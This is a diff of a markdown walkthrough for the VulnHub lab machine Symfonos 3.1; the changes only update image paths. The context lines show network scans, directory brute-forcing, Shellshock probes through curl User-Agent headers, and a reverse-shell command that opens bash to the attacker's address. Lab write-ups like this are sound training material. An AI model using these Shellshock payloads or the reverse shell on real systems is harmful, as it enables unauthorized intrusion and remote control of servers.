@@ -3,7 +3,7 @@
 - **Machine:** Symfonos: 3.1
 - **Download:** https://www.vulnhub.com/entry/symfonos-31,332/
 
-![](781-1.png)
+![](images/781-1.png)
 
 ---
 
@@ -26,7 +26,7 @@ Identify the IP address assigned to the target.
 nmap -sn 10.19.212.0/24
 ```
 
-![](781-2.png)
+![](images/781-2.png)
 
 ---
 
@@ -38,7 +38,7 @@ Perform a complete scan to enumerate open ports, services, operating system deta
 nmap -v -Pn -sT -sV -sC -A -O -p- 10.19.212.43
 ```
 
-![](781-3.png)
+![](images/781-3.png)
 
 ---
 
@@ -86,7 +86,7 @@ Discover hidden directories.
 gobuster dir -u http://10.19.212.43 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-![](781-4.png)
+![](images/781-4.png)
 
 Discovered directories:
 
@@ -108,7 +108,7 @@ Perform additional enumeration against the CGI directory.
 feroxbuster -u http://10.19.212.43/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 ```
 
-![](781-5.png)
+![](images/781-5.png)
 
 Discovered endpoint:
 
@@ -116,7 +116,7 @@ Discovered endpoint:
 http://10.19.212.43/cgi-bin/underworld
 ```
 
-![](781-6.png)
+![](images/781-6.png)
 
 ---
 
@@ -128,7 +128,7 @@ Test whether the CGI script is vulnerable to the Shellshock vulnerability.
 curl -H 'User-Agent: () { :;}; echo; echo vulnerable' http://10.19.212.43/cgi-bin/underworld
 ```
 
-![](781-7.png)
+![](images/781-7.png)
 
 The server responds with injected output, confirming that the CGI application is vulnerable.
 
@@ -142,7 +142,7 @@ Execute a simple command to confirm Remote Command Execution.
 curl -H 'User-Agent: () { :;}; echo; /usr/bin/id' http://10.19.212.43/cgi-bin/underworld
 ```
 
-![](781-8.png)
+![](images/781-8.png)
 
 The command executes successfully, confirming Remote Code Execution through the Shellshock vulnerability.
 
@@ -170,7 +170,7 @@ curl -H 'User-Agent: () { :;}; /bin/bash -c "bash -i >& /dev/tcp/10.19.212.4/444
 
 A reverse shell is received.
 
-![](781-9.png)
+![](images/781-9.png)
 
 ---
 
